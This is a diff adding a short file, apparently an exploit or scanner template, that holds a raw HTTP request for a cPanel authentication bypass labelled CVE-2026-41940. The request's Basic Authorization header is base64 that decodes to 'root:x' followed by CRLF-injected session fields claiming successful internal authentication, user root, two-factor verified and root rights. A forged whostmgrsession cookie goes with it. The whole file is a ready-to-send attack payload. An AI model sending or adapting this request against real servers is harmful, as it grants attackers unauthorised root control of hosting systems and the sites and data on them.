@@ -1,0 +1,7 @@
+# cPanel 授权认证绕过漏洞 (CVE-2026-41940)
+GET / HTTP/1.1
+Host: www.xwd_test.com
+Cookie: whostmgrsession=%3aWg_mjzgt1hyfXefK
+Authorization: Basic cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x
+Connection: close
+
